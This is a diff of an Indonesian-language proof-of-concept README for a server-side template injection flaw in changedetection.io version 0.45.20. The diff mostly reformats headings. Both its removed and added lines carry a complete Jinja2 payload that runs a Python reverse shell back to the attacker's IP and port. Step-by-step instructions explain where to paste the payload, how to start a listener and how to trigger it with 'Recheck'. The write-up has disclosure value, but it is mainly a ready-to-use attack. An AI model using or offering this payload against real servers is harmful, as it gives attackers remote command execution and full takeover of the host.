@@ -1,13 +1,13 @@
 # CHANGEDETECTION
 *Uji coba pada versi 0.45.20*
 
-# Cara Kerja
+## Cara Kerja
 ChangeDetection.io bekerja dengan cara mengambil snapshot dari halaman web yang dipantau pada interval waktu tertentu, lalu membandingkannya dengan snapshot sebelumnya untuk mendeteksi perubahan. Pengguna dapat menentukan URL halaman yang ingin dipantau untuk memantau area tertentu saja. Ketika perubahan terdeteksi, sistem akan mengirimkan notifikasi melalui metode yang dipilih, seperti Discord, Email, Slack, Telegram, API calls, dan lainnya. 
 
-# Kerentanan
+## Kerentanan
 Kerentanan Server-Side Template Injection (SSTI) pada aplikasi changedetection.io yang menggunakan mesin template Jinja2. Kerentanan ini memungkinkan penyerang melakukan Remote Command Execution (RCE) pada host server, memberikan mereka kemampuan untuk menjalankan perintah sistem tanpa batasan, termasuk kemungkinan penggunaan reverse shell. Dampaknya sangat kritis karena penyerang dapat mengambil alih sepenuhnya mesin server.
 
-# Langkah-langkah
+## Langkah-langkah
 *Sebelum memulai, jalankan web server anda (http.server)*
 
 1. Intro (silahkan login menggunakan kata sandi anda)
@@ -20,9 +20,9 @@ Kerentanan Server-Side Template Injection (SSTI) pada aplikasi changedetection.i
    *pastikan "Send a notification .." di centang*
 
 4. Pada "Notification URL List", input "gets://<ip>". Pada bagian "Notification Body", copy & paste payload dan ubah IP serta port.
-
-*payload: {{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<your_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}*
-
+```sh
+payload: {{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<your_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}*
+```
 SAVE!!
 (Kembali ke Dashboard)
 
@@ -30,15 +30,13 @@ SAVE!!
 
 1. Aktifkan listener, masukkan port sesuai dengan port yang telah ditentukan pada payload sebelumnya
 2. Tambahkan sebuah file pada direktori di "/home/user/" (pada kasus saya,  silahkan sesuaikan dengan kondisi anda)
-3. Klik "Recheck" pada bagian alamat website anda.
+3. Klik "Recheck"
 4. Perhatikan listener anda!
-
-*jika gagal, lanjut poin 5*
-
+>jika gagal, lanjut poin 5
 5. Reload dashboard
 6. Hapus file pada direktori di pc
 7. Kembali ke web, centang bagian alamat website anda, kemudian klik "Recheck"
-*Jika masih gagal, perhatikan video dibawah*
+>Jika masih gagal, perhatikan video dibawah
 
 # PoC
 https://github.com/user-attachments/assets/af73e1cd-b55d-480d-8f9e-0129ded43b75
